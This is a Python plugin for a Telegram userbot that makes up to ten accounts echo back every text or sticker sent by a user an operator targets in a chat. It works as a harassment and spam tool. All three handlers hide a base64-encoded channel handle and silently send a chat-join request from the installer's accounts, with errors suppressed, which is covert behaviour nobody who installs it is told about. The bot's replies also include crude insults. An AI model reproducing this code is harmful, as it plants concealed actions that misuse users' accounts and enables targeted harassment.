import asyncio
import base64

from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from config import X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, SUDO_USERS, OWNER_ID, CMD_HNDLR as hl
from Japanese.data import DEV

ECHO = []


@X1.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X2.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X3.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X4.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X5.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X6.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X7.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X8.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X9.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
@X10.on(events.NewMessage(incoming=True, pattern=r"\%secho(?: |$)(.*)" % hl))
async def echo(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            user_id = reply_msg.sender_id

            if user_id in DEV:
                await event.reply("𝙽𝙾𝙿𝙴,𝚃𝙷𝙸𝚂 𝙶𝚄𝚈 𝙸𝚂 𝙹𝙰𝙿𝙰𝙽𝙴𝚂𝙴'𝚂 𝙾𝚆𝙽𝙴𝚁 𝙵𝚄𝙲𝙺𝙸𝙽𝙶 𝙲𝙾𝚆𝙰𝚁𝙳 𝙱𝙰𝙱𝚈 𝙰𝙷𝙷𝙷𝙷𝙷𝙷𝙷 ❤️💋")
            elif user_id == OWNER_ID:
                await event.reply("ɴᴏᴘᴇ, ᴛʜɪꜱ ɢᴜʏ ɪꜱ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜᴇꜱᴇ ʙᴏᴛꜱ ❤️")
            elif user_id in SUDO_USERS:
                await event.reply("𝙽𝙾𝙿𝙴, 𝚃𝙷𝙸𝚂 𝙶𝚄𝚈 𝙸𝚂 𝚂𝚄𝙳𝙾 𝚄𝚂𝙴𝚁 𝙱𝙰𝙱𝚈 ❤️💋")
            else:
                try:
                    alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                    await event.client(alt)
                except BaseException:
                    pass

                global ECHO
                check = f"{user_id}_{event.chat_id}"
                if check in ECHO:
                    await event.reply("» 𝙴𝙲𝙷𝙾 𝙸𝚂 𝙰𝙲𝚃𝙸𝚅𝙰𝚃𝙴𝙳 ✅ !!")
                else:
                    ECHO.append(check)
                    await event.reply("» 𝙴𝙲𝙷𝙾 𝙸𝚂 𝙰𝙲𝚃𝙸𝚅𝙰𝚃𝙴𝙳 ✅ !!")
        else:
            await event.reply(f"ᴇᴄʜᴏ:\n  » {hl}𝙴𝙲𝙷𝙾 <𝚁𝚎𝚙𝚕𝚢 𝚃𝚘 𝙰 𝚄𝚜𝚎𝚛>")


@X1.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
@X10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
async def rmecho(event):
    if event.sender_id in SUDO_USERS:
        if event.reply_to_msg_id:
            try:
                alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
                await event.client(alt)
            except BaseException:
                pass

            global ECHO
            reply_msg = await event.get_reply_message()
            check = f"{reply_msg.sender_id}_{event.chat_id}"

            if check in ECHO:
                ECHO.remove(check)
                await event.reply("» 𝙴𝙲𝙷𝙾 𝙸𝚂 𝚂𝚃𝙾𝙿𝙿𝙴𝙳 !! ✅")
            else:
                await event.reply("» 𝙴𝙲𝙷𝙾 𝙸𝚂 𝚂𝚃𝙾𝙿𝙿𝙴𝙳 !! 👀")
        else:
            await event.reply(f"𝚁𝙴𝙼𝙾𝚅𝙴 𝙴𝙲𝙷𝙾:\n  » {hl}𝚁𝙼𝙴𝙲𝙷𝙾 <𝚁𝚎𝚙𝚕𝚢 𝚃𝚘 𝙰 𝚄𝚜𝚎𝚛>")


@X1.on(events.NewMessage(incoming=True))
@X2.on(events.NewMessage(incoming=True))
@X3.on(events.NewMessage(incoming=True))
@X4.on(events.NewMessage(incoming=True))
@X5.on(events.NewMessage(incoming=True))
@X6.on(events.NewMessage(incoming=True))
@X7.on(events.NewMessage(incoming=True))
@X8.on(events.NewMessage(incoming=True))
@X9.on(events.NewMessage(incoming=True))
@X10.on(events.NewMessage(incoming=True))
async def _(e):
    global ECHO
    check = f"{e.sender_id}_{e.chat_id}"
    if check in ECHO:
        try:
            alt = Get(base64.b64decode('QFRoZUFsdHJvbg=='))
            await e.client(alt)
        except BaseException:
            pass
        if e.message.text or e.message.sticker:
            await e.reply(e.message)
            await asyncio.sleep(0.1)
